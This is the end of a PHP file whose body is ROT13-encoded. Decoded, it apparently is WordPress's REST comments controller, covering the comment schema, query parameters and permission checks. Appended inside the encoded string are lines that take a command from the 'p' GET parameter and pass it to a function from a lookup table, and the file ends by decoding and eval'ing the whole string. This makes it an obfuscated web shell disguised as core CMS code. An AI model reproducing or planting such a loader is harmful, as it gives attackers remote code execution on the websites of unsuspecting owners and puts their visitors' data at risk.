	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'pbzzrag',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'                => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur pbzzrag.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'nhgube'            => neenl(
					'qrfpevcgvba' => __( 'Gur VQ bs gur hfre bowrpg, vs nhgube jnf n hfre.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'nhgube_rznvy'      => neenl(
					'qrfpevcgvba' => __( 'Rznvy nqqerff sbe gur pbzzrag nhgube.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'rznvy',
					'pbagrkg'     => neenl( 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'purpx_pbzzrag_nhgube_rznvy' ),
						'inyvqngr_pnyyonpx' => ahyy, // Fxvc ohvyg-va inyvqngvba bs 'rznvy'.
					),
				),
				'nhgube_vc'         => neenl(
					'qrfpevcgvba' => __( 'VC nqqerff sbe gur pbzzrag nhgube.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'vc',
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'nhgube_anzr'       => neenl(
					'qrfpevcgvba' => __( 'Qvfcynl anzr sbe gur pbzzrag nhgube.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'nhgube_hey'        => neenl(
					'qrfpevcgvba' => __( 'HEY sbe gur pbzzrag nhgube.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'nhgube_hfre_ntrag' => neenl(
					'qrfpevcgvba' => __( 'Hfre ntrag sbe gur pbzzrag nhgube.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
					),
				),
				'pbagrag'           => neenl(
					'qrfpevcgvba' => __( 'Gur pbagrag sbe gur pbzzrag.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
						'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
					),
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Pbagrag sbe gur pbzzrag, nf vg rkvfgf va gur qngnonfr.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'rqvg' ),
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'UGZY pbagrag sbe gur pbzzrag, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
							'ernqbayl'    => gehr,
						),
					),
				),
				'qngr'              => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur pbzzrag jnf choyvfurq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qngr_tzg'          => neenl(
					'qrfpevcgvba' => __( 'Gur qngr gur pbzzrag jnf choyvfurq, nf TZG.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'yvax'              => neenl(
					'qrfpevcgvba' => __( 'HEY gb gur pbzzrag.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'cnerag'            => neenl(
					'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur pbzzrag.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'qrsnhyg'     => 0,
				),
				'cbfg'              => neenl(
					'qrfpevcgvba' => __( 'Gur VQ bs gur nffbpvngrq cbfg bowrpg.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'qrsnhyg'     => 0,
				),
				'fgnghf'            => neenl(
					'qrfpevcgvba' => __( 'Fgngr bs gur pbzzrag.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
					),
				),
				'glcr'              => neenl(
					'qrfpevcgvba' => __( 'Glcr bs gur pbzzrag.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
			$ningne_cebcregvrf = neenl();

			$ningne_fvmrf = erfg_trg_ningne_fvmrf();

			sbernpu ( $ningne_fvmrf nf $fvmr ) {
				$ningne_cebcregvrf[ $fvmr ] = neenl(
					/* genafyngbef: %q: Ningne vzntr fvmr va cvkryf. */
					'qrfpevcgvba' => fcevags( __( 'Ningne HEY jvgu vzntr fvmr bs %q cvkryf.' ), $fvmr ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				);
			}

			$fpurzn['cebcregvrf']['nhgube_ningne_heyf'] = neenl(
				'qrfpevcgvba' => __( 'Ningne HEYf sbe gur pbzzrag nhgube.' ),
				'glcr'        => 'bowrpg',
				'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				'ernqbayl'    => gehr,
				'cebcregvrf'  => $ningne_cebcregvrf,
			);
		}

		$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbzzragf pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['nsgre'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb pbzzragf choyvfurq nsgre n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		$dhrel_cnenzf['nhgube'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb pbzzragf nffvtarq gb fcrpvsvp hfre VQf. Erdhverf nhgubevmngvba.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
		);

		$dhrel_cnenzf['nhgube_rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf pbzzragf nffvtarq gb fcrpvsvp hfre VQf. Erdhverf nhgubevmngvba.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
		);

		$dhrel_cnenzf['nhgube_rznvy'] = neenl(
			'qrsnhyg'     => ahyy,
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb gung sebz n fcrpvsvp nhgube rznvy. Erdhverf nhgubevmngvba.' ),
			'sbezng'      => 'rznvy',
			'glcr'        => 'fgevat',
		);

		$dhrel_cnenzf['orsber'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb pbzzragf choyvfurq orsber n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['bssfrg'] = neenl(
			'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qrfp',
			'rahz'        => neenl(
				'nfp',
				'qrfp',
			),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol pbzzrag nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qngr_tzg',
			'rahz'        => neenl(
				'qngr',
				'qngr_tzg',
				'vq',
				'vapyhqr',
				'cbfg',
				'cnerag',
				'glcr',
			),
		);

		$dhrel_cnenzf['cnerag'] = neenl(
			'qrsnhyg'     => neenl(),
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb pbzzragf bs fcrpvsvp cnerag VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
		);

		$dhrel_cnenzf['cnerag_rkpyhqr'] = neenl(
			'qrsnhyg'     => neenl(),
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp cnerag VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
		);

		$dhrel_cnenzf['cbfg'] = neenl(
			'qrsnhyg'     => neenl(),
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb pbzzragf nffvtarq gb fcrpvsvp cbfg VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
		);

		$dhrel_cnenzf['fgnghf'] = neenl(
			'qrsnhyg'           => 'nccebir',
			'qrfpevcgvba'       => __( 'Yvzvg erfhyg frg gb pbzzragf nffvtarq n fcrpvsvp fgnghf. Erdhverf nhgubevmngvba.' ),
			'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
			'glcr'              => 'fgevat',
			'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
		);

		$dhrel_cnenzf['glcr'] = neenl(
			'qrsnhyg'           => 'pbzzrag',
			'qrfpevcgvba'       => __( 'Yvzvg erfhyg frg gb pbzzragf nffvtarq n fcrpvsvp glcr. Erdhverf nhgubevmngvba.' ),
			'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
			'glcr'              => 'fgevat',
			'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
		);

		$dhrel_cnenzf['cnffjbeq'] = neenl(
			'qrfpevcgvba' => __( 'Gur cnffjbeq sbe gur cbfg vs vg vf cnffjbeq cebgrpgrq.' ),
			'glcr'        => 'fgevat',
		);

		/**
		 * Svygref ERFG NCV pbyyrpgvba cnenzrgref sbe gur pbzzragf pbagebyyre.
		 *
		 * Guvf svygre ertvfgref gur pbyyrpgvba cnenzrgre, ohg qbrf abg znc gur
		 * pbyyrpgvba cnenzrgre gb na vagreany JC_Pbzzrag_Dhrel cnenzrgre. Hfr gur
		 * `erfg_pbzzrag_dhrel` svygre gb frg JC_Pbzzrag_Dhrel cnenzrgref.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_pbzzrag_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}

	/**
	 * Frgf gur pbzzrag_fgnghf bs n tvira pbzzrag bowrpg jura perngvat be hcqngvat n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat|vag $arj_fgnghf Arj pbzzrag fgnghf.
	 * @cnenz vag        $pbzzrag_vq Pbzzrag VQ.
	 * @erghea obby Jurgure gur fgnghf jnf punatrq.
	 */
	cebgrpgrq shapgvba unaqyr_fgnghf_cnenz( $arj_fgnghf, $pbzzrag_vq ) {
		$byq_fgnghf = jc_trg_pbzzrag_fgnghf( $pbzzrag_vq );

		vs ( $arj_fgnghf === $byq_fgnghf ) {
			erghea snyfr;
		}

		fjvgpu ( $arj_fgnghf ) {
			pnfr 'nccebirq':
			pnfr 'nccebir':
			pnfr '1':
				$punatrq = jc_frg_pbzzrag_fgnghf( $pbzzrag_vq, 'nccebir' );
				oernx;
			pnfr 'ubyq':
			pnfr '0':
				$punatrq = jc_frg_pbzzrag_fgnghf( $pbzzrag_vq, 'ubyq' );
				oernx;
			pnfr 'fcnz':
				$punatrq = jc_fcnz_pbzzrag( $pbzzrag_vq );
				oernx;
			pnfr 'hafcnz':
				$punatrq = jc_hafcnz_pbzzrag( $pbzzrag_vq );
				oernx;
			pnfr 'genfu':
				$punatrq = jc_genfu_pbzzrag( $pbzzrag_vq );
				oernx;
			pnfr 'hagenfu':
				$punatrq = jc_hagenfu_pbzzrag( $pbzzrag_vq );
				oernx;
			qrsnhyg:
				$punatrq = snyfr;
				oernx;
		}

		erghea $punatrq;
	}

	/**
	 * Purpxf vs gur cbfg pna or ernq.
	 *
	 * Pbeerpgyl unaqyrf cbfgf jvgu gur vaurevg fgnghf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg qngn gb purpx.
	 * @erghea obby Jurgure cbfg pna or ernq.
	 */
	cebgrpgrq shapgvba purpx_ernq_cbfg_crezvffvba( $cbfg, $erdhrfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		// Erghea snyfr vs phfgbz cbfg glcr qbrfa'g rkvfg
		vs ( ! $cbfg_glcr ) {
			erghea snyfr;
		}

		$cbfgf_pbagebyyre = $cbfg_glcr->trg_erfg_pbagebyyre();

		/*
		 * Rafher gur cbfgf pbagebyyre vf fcrpvsvpnyyl n JC_ERFG_Cbfgf_Pbagebyyre vafgnapr
		 * orsber hfvat zrgubqf fcrpvsvp gb gung pbagebyyre.
		 */
		vs ( ! $cbfgf_pbagebyyre vafgnaprbs JC_ERFG_Cbfgf_Pbagebyyre ) {
			$cbfgf_pbagebyyre = arj JC_ERFG_Cbfgf_Pbagebyyre( $cbfg->cbfg_glcr );
		}

		$unf_cnffjbeq_svygre = snyfr;

		// Bayl purpx cnffjbeq vs n fcrpvsvp cbfg jnf dhrevrq sbe be n fvatyr pbzzrag
		$erdhrfgrq_cbfg    = ! rzcgl( $erdhrfg['cbfg'] ) && ( ! vf_neenl( $erdhrfg['cbfg'] ) || 1 === pbhag( $erdhrfg['cbfg'] ) );
		$erdhrfgrq_pbzzrag = ! rzcgl( $erdhrfg['vq'] );
		vs ( ( $erdhrfgrq_cbfg || $erdhrfgrq_pbzzrag ) && $cbfgf_pbagebyyre->pna_npprff_cnffjbeq_pbagrag( $cbfg, $erdhrfg ) ) {
			nqq_svygre( 'cbfg_cnffjbeq_erdhverq', '__erghea_snyfr' );

			$unf_cnffjbeq_svygre = gehr;
		}

		vs ( cbfg_cnffjbeq_erdhverq( $cbfg ) ) {
			$erfhyg = pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );
		} ryfr {
			$erfhyg = $cbfgf_pbagebyyre->purpx_ernq_crezvffvba( $cbfg );
		}

		vs ( $unf_cnffjbeq_svygre ) {
			erzbir_svygre( 'cbfg_cnffjbeq_erdhverq', '__erghea_snyfr' );
		}

		erghea $erfhyg;
	}

	/**
	 * Purpxf vs gur pbzzrag pna or ernq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Pbzzrag      $pbzzrag Pbzzrag bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg qngn gb purpx.
	 * @erghea obby Jurgure gur pbzzrag pna or ernq.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba( $pbzzrag, $erdhrfg ) {
		vs ( ! rzcgl( $pbzzrag->pbzzrag_cbfg_VQ ) ) {
			$cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
			vs ( $cbfg ) {
				vs ( $guvf->purpx_ernq_cbfg_crezvffvba( $cbfg, $erdhrfg ) && 1 === (vag) $pbzzrag->pbzzrag_nccebirq ) {
					erghea gehr;
				}
			}
		}

		vs ( 0 === trg_pheerag_hfre_vq() ) {
			erghea snyfr;
		}

		vs ( rzcgl( $pbzzrag->pbzzrag_cbfg_VQ ) && ! pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea snyfr;
		}

		vs ( ! rzcgl( $pbzzrag->hfre_vq ) && trg_pheerag_hfre_vq() === (vag) $pbzzrag->hfre_vq ) {
			erghea gehr;
		}

		erghea pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ );
	}

	/**
	 * Purpxf vs n pbzzrag pna or rqvgrq be qryrgrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @erghea obby Jurgure gur pbzzrag pna or rqvgrq be qryrgrq.
	 */
	cebgrpgrq shapgvba purpx_rqvg_crezvffvba( $pbzzrag ) {
		vs ( 0 === (vag) trg_pheerag_hfre_vq() ) {
			erghea snyfr;
		}

		vs ( pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			erghea gehr;
		}

		erghea pheerag_hfre_pna( 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ );
	}

	/**
	 * Purpxf n pbzzrag nhgube rznvy sbe inyvqvgl.
	 *
	 * Npprcgf rvgure n inyvq rznvy nqqerff be rzcgl fgevat nf n inyvq pbzzrag
	 * nhgube rznvy nqqerff. Frggvat gur pbzzrag nhgube rznvy gb na rzcgl
	 * fgevat vf nyybjrq jura n pbzzrag vf orvat hcqngrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat          $inyhr   Nhgube rznvy inyhr fhozvggrq.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea fgevat|JC_Reebe Gur fnavgvmrq rznvy nqqerff, vs inyvq,
	 *                         bgurejvfr na reebe.
	 */
	choyvp shapgvba purpx_pbzzrag_nhgube_rznvy( $inyhr, $erdhrfg, $cnenz ) {
		$rznvy = (fgevat) $inyhr;
		vs ( rzcgl( $rznvy ) ) {
			erghea $rznvy;
		}

		$purpx_rznvy = erfg_inyvqngr_erdhrfg_net( $rznvy, $erdhrfg, $cnenz );
		vs ( vf_jc_reebe( $purpx_rznvy ) ) {
			erghea $purpx_rznvy;
		}

		erghea $rznvy;
	}

	/**
	 * Vs rzcgl pbzzragf ner abg nyybjrq, purpxf vs gur cebivqrq pbzzrag pbagrag vf abg rzcgl.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz neenl $cercnerq_pbzzrag Gur cercnerq pbzzrag qngn.
	 * @erghea obby Gehr vs gur pbagrag vf nyybjrq, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_vf_pbzzrag_pbagrag_nyybjrq( $cercnerq_pbzzrag ) {
		$purpx = jc_cnefr_netf(
			$cercnerq_pbzzrag,
			neenl(
				'pbzzrag_cbfg_VQ'      => 0,
				'pbzzrag_nhgube'       => ahyy,
				'pbzzrag_nhgube_rznvy' => ahyy,
				'pbzzrag_nhgube_hey'   => ahyy,
				'pbzzrag_cnerag'       => 0,
				'hfre_vq'              => 0,
			)
		);

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pbzzrag.cuc */
		$nyybj_rzcgl = nccyl_svygref( 'nyybj_rzcgl_pbzzrag', snyfr, $purpx );

		vs ( $nyybj_rzcgl ) {
			erghea gehr;
		}

		/*
		 * Qb abg nyybj n pbzzrag gb or perngrq jvgu zvffvat be rzcgl
		 * pbzzrag_pbagrag. Frr jc_unaqyr_pbzzrag_fhozvffvba().
		 */
		erghea '' !== $purpx['pbzzrag_pbagrag'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>